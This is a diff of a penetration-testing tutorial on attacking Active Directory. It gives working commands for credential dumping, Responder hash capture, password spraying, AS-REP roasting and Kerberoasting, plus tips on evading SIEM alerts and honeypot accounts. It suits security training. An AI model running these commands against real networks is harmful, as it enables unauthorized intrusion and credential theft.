@@ -167,15 +167,15 @@ While you're at it — don't forget to check for known critical vulnerabilities 
 nxc smb 192.168.1.0/24 -M ms17-010
 ```
 
-If a domain-joined machine is vulnerable, you land as SYSTEM on that host. From there you can dump local credentials and machine account hashes:
+If a domain-joined machine is vulnerable, you land as SYSTEM on that host. From there you can dump local credentials — SAM hashes, LSA secrets, and cached domain credentials:
 
 ```bash
-impacket-secretsdump -just-dc-user administrator corp.local/CORP-PC\$@192.168.1.20 -no-pass
-```
+# Save registry hives from SYSTEM shell
+reg save HKLM\SAM sam.save
+reg save HKLM\SECURITY security.save
+reg save HKLM\SYSTEM system.save
 
-Or if you have SYSTEM shell via exploit and want to dump everything locally:
-
-```bash
+# Dump locally from saved hives
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
 
@@ -196,7 +196,7 @@ responder -I eth0 -wf
 Responder poisons LLMNR, NBT-NS, and MDNS responses — when a machine on the network tries to resolve a hostname that doesn't exist in DNS, Responder answers and captures the authentication attempt. The result is an NTLMv2 hash.
 
 ```
-[SMB] NTLMv2-SSP Hash : john.doe::CORP:a3f8c2d1e9b8...
+[SMB] NTLMv2-SSP Hash : r.nilson::CORP:a3f8c2d1e9b8...
 ```
 
 Take it offline:
@@ -326,7 +326,6 @@ After all that work, your list might look something like this:
 
 ```
 r.nilson@corp.local
-j.smith@corp.local
 a.kowalski@corp.local
 m.brown@corp.local
 d.jones@corp.local
@@ -354,11 +353,11 @@ Output:
 
 ```
 2026/08/11 14:22:01 >  [+] VALID USERNAME: r.nilson@corp.local
-2026/08/11 14:22:01 >  [+] VALID USERNAME: j.smith@corp.local
-2026/08/11 14:22:01 >  [-] INVALID: a.kowalski@corp.local
 2026/08/11 14:22:01 >  [+] VALID USERNAME: m.brown@corp.local
-2026/08/11 14:22:01 >  [-] INVALID: d.jones@corp.local
+2026/08/11 14:22:01 >  [-] INVALID: a.kowalski@corp.local
 2026/08/11 14:22:01 >  [+] VALID USERNAME: k.mueller@corp.local
+2026/08/11 14:22:01 >  [-] INVALID: d.jones@corp.local
+2026/08/11 14:22:01 >  [+] VALID USERNAME: t.wagner@corp.local
 ```
 
 In practice you'll often find that 60-70% of your OSINT-generated list is valid — the rest are outdated entries or people who've left. Now you have a clean, confirmed list of real accounts. That's what we work with from here.
@@ -390,6 +389,17 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 If it cracks — you have a valid plaintext credential. Skip spraying entirely and move straight to authenticated enumeration.
 
 If nothing comes back — no accounts have pre-auth disabled, or the hashes didn't crack. That's fine. Move to the next step.
+
+> **Heads up:** In well-defended environments, security teams sometimes configure honeypot accounts — fake accounts with pre-authentication disabled specifically to attract AS-REP Roasting attempts. The moment you request a ticket for one of these accounts, an alert fires. There's no reliable way to identify them beforehand since they look like any other account. This is another reason to be targeted rather than throwing your entire list at the DC blindly — the smaller and more deliberate your list, the lower the chance of hitting a trap.
+>
+> **If you already have credentials** from a previous step, you can query account attributes before roasting — specifically `lastLogon` and `logonCount`. Honeypot accounts by their nature are rarely or never actually used, so they tend to have suspiciously low logon counts or a `lastLogon` value of zero. A real employee account that's been active for years will have hundreds of logons and a recent timestamp. An account that's never been logged into is worth a second look before you request a ticket for it:
+>
+> ```bash
+> ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
+>   -b "DC=corp,DC=local" "(sAMAccountName=suspicioususer)" lastLogon logonCount userAccountControl
+> ```
+>
+> This won't catch every honeypot — some are configured more carefully — but it's a quick sanity check that costs nothing.
 
 > AS-REP Roasting and Kerberoasting are deep topics — the underlying Kerberos protocol mechanics, ticket structure, and detection evasion are covered in detail in a dedicated post.
 
@@ -476,7 +486,7 @@ nxc smb 192.168.1.10 -u valid_users.txt -p 'Winter2025!' --continue-on-success
 Successful hit looks like this:
 
 ```
-SMB  192.168.1.10  445  CORP-DC  [+] corp.local\j.smith:Winter2025! 
+SMB  192.168.1.10  445  CORP-DC  [+] corp.local\r.nilson:Winter2025! 
 ```
 
 **Spraying with Kerbrute:**
@@ -502,7 +512,7 @@ Check for SMB null sessions, RPC null sessions, LDAP anonymous bind. If any work
 No null sessions or anon binds. Look elsewhere in the network segment — NFS, FTP without auth, internal web apps, config files on accessible shares. Collect credentials or login format clues. Then: same as above — AS-REP or spraying.
 
 **Chain 3 — Protocol exploitation**
-No open services, nothing useful in the segment. Look for known vulnerabilities — EternalBlue being the classic example. Compromise a domain-joined machine, land as SYSTEM, use the machine account to query AD or run SharpHound. Now you have a full user list and domain structure. From here: password spraying, AS-REP Roasting, and — since you now have an authenticated context — Kerberoasting. That last one is covered in Part 2.
+No open services, nothing useful in the segment. Look for known vulnerabilities — EternalBlue being the classic example. Compromise a domain-joined machine, land as SYSTEM, use the machine account to query AD or run SharpHound. Now you have a full user list and domain structure. From here: password spraying, AS-REP Roasting, and — since you now have an authenticated context — Kerberoasting.
 
 **Chain 4 — OSINT when everything else fails**
 No open services, no exploitable vulnerabilities, Responder caught nothing. You go external. Scrape LinkedIn with linkedin2username, confirm the login format from the company website or PDF metadata, generate a clean username list with username-anarchy or a bash one-liner. Validate it with Kerbrute to cut out stale accounts. Then: AS-REP Roasting against the confirmed list, followed by password spraying — one password at a time, within the lockout policy window.
@@ -510,3 +520,148 @@ No open services, no exploitable vulnerabilities, Responder caught nothing. You 
 These chains aren't mutually exclusive and they're not strictly sequential. Real engagements are messy — you follow what the environment gives you. The point is to understand what each technique requires and what it produces, so you can chain them together logically without making noise you don't need to make.
 
 You now have a valid credential. Build the house.
+
+---
+
+## Part 2: You Have Credentials — Now What?
+
+You have a username and a password. Or a hash. Either way — you can authenticate. The game changes completely at this point.
+
+### The Temptation: BloodHound
+
+The first instinct for most people is to fire up BloodHound and collect everything at once. And honestly — it's a great instinct. BloodHound is the single best tool for understanding an AD environment, visualizing attack paths, and finding the shortest route to Domain Admin.
+
+But it comes at a cost. BloodHound's collector (SharpHound on Windows, BloodHound.py on Linux) works by sending a large volume of LDAP queries to the DC in a short amount of time. In a monitored environment, that kind of traffic stands out — it looks exactly like what it is: automated enumeration. A tuned SIEM or an alert defender will notice.
+
+```bash
+# Remote collection from Linux
+bloodhound-python -u r.nilson -p 'Winter2025!' -d corp.local --dc 192.168.1.10 -c All
+```
+
+If stealth isn't a concern — run it. The data you get is invaluable. If you're in a red team engagement where staying undetected matters — read on.
+
+### Staying Quiet: Targeted Enumeration
+
+When noise is a problem, ditch the automated collectors and go manual. The idea is simple: instead of sending hundreds of LDAP queries automatically, you send exactly the queries you need, one at a time. Less traffic, less pattern, less detection.
+
+The tools for this:
+
+**ldapsearch** — raw LDAP queries, surgical precision:
+
+```bash
+# Who is Rick Nilson?
+ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
+  -b "DC=corp,DC=local" "(sAMAccountName=r.nilson)"
+
+# What groups is he in?
+ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
+  -b "DC=corp,DC=local" "(member=CN=Rick Nilson,CN=Users,DC=corp,DC=local)" cn
+```
+
+**rpcclient** — enumerating users, groups, and shares over RPC:
+
+```bash
+rpcclient -U "r.nilson%Winter2025!" 192.168.1.10
+
+# Inside rpcclient:
+enumdomusers
+enumdomgroups
+queryuser r.nilson
+# Take the RID from queryuser output, then:
+queryusergroups <RID>
+```
+
+**bloodyAD** — the best manual alternative to BloodHound. Think of it as BloodHound's quieter cousin — targeted queries, no mass enumeration:
+
+```bash
+bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --dc-ip 192.168.1.10 get object r.nilson --attr memberOf
+bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --dc-ip 192.168.1.10 get membership r.nilson
+```
+
+### First Questions to Answer
+
+When you land with a credential, the first thing you want to know is: **who is this user and what can they reach?**
+
+#### Who is Rick Nilson?
+
+Check his group memberships — this tells you his privilege level immediately:
+
+```bash
+nxc smb 192.168.1.10 -u r.nilson -p 'Winter2025!' --groups
+```
+
+Is he in Domain Admins? Remote Desktop Users? Account Operators? Each group opens different doors. Even a regular user in an unexpected group can be the beginning of an attack chain.
+
+#### What Shares Can He Access?
+
+With valid credentials, enumerate SMB shares across the network segment:
+
+```bash
+nxc smb 192.168.1.0/24 -u r.nilson -p 'Winter2025!' --shares
+```
+
+Authenticated access opens significantly more than null sessions. You may find shares that were invisible before — file servers, backup shares, department folders. Dig through them:
+
+```bash
+nxc smb 192.168.1.10 -u r.nilson -p 'Winter2025!' -M spider_plus
+```
+
+People store things they shouldn't in file shares. Credentials, scripts, backups, database dumps. It's worth the time.
+
+> **A note for later:** Writable shares open up interesting attack paths — for example, dropping a malicious `.lnk` file on a share and capturing the hash of anyone who opens the folder with Responder listening. That's a topic for a dedicated post, but keep it in mind.
+
+#### What Services Can He Reach?
+
+Credentials open more than just SMB. Scan the internal network for services that accept authentication:
+
+- **Web panels** — internal GitLab, Confluence, JIRA, monitoring dashboards, admin panels. Try the same credentials everywhere. Password reuse is real.
+- **WinRM** — if the user is in the Remote Management Users group, you may get a shell:
+
+```bash
+nxc winrm 192.168.1.0/24 -u r.nilson -p 'Winter2025!'
+```
+
+- **Exchange / internal mail** — if the environment has on-prem Exchange or is synced with Azure AD, email access opens the door to internal phishing. You can send emails as a legitimate internal user — that's a very different threat surface than an external phish.
+- **Local Slack, Teams, or other internal tools** — people discuss sensitive things in chat. Credentials, deployment procedures, incident response. Worth checking if accessible.
+
+> **Critical note on scope:** Accessing internal communication platforms — Teams, Slack, email — and anything related to phishing or social engineering must be explicitly agreed upon with the client before you touch it. This isn't a formality. Reading internal messages, impersonating employees, or sending phishing emails as a legitimate user can have serious legal and reputational consequences for both sides. Every step of this nature needs to be in scope, documented, and pre-approved. When in doubt — stop and ask. No finding is worth the legal exposure.
+
+### Kerberoasting — The First Escalation Attempt
+
+One of the first things to try with any authenticated context — whether it's a domain user account or a SYSTEM shell on a domain-joined machine — is Kerberoasting.
+
+Here's the concept: Active Directory uses **Service Principal Names (SPNs)** to associate services with accounts. An SPN is essentially a unique identifier that says "this account runs this service." Any authenticated user in the domain can query the DC for a list of all accounts that have SPNs registered.
+
+When you request a Kerberos service ticket for one of those accounts, the DC responds with a ticket encrypted using that service account's password hash. You take that ticket offline and crack it. No elevated privileges required — just a valid domain authentication context.
+
+```bash
+# Request all Kerberoastable accounts
+impacket-GetUserSPNs corp.local/r.nilson:'Winter2025!' -dc-ip 192.168.1.10 -request
+```
+
+Output:
+
+```
+ServicePrincipalName          Name          MemberOf  PasswordLastSet
+----------------------------  ------------  --------  -------------------
+MSSQLSvc/sql01.corp.local     svc_sql                 2023-04-12 09:14:22
+HTTP/intranet.corp.local      svc_web                 2022-11-03 14:55:01
+
+$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local*$a3f8c2...
+```
+
+Crack it offline:
+
+```bash
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+Service accounts are often overlooked from a password hygiene perspective — they get created, assigned a weak password, and never touched again. That makes them prime Kerberoasting targets.
+
+The same logic applies if you compromised a domain-joined machine as SYSTEM — the machine account itself can authenticate to the domain and request SPNs, so you don't even need a user credential.
+
+> AS-REP Roasting and Kerberoasting — the underlying Kerberos protocol mechanics, ticket structure, opsec considerations, and detection evasion — are covered in depth in a dedicated post.
+
+### The Bigger Picture
+
+One credential is a foothold into the authenticated world of AD. From here the enumeration goes deeper — ACLs, GPOs, trust relationships, delegation configurations, and attack paths that only become visible once you're inside. That's where BloodHound really shines and where the path to Domain Admin starts taking shape.
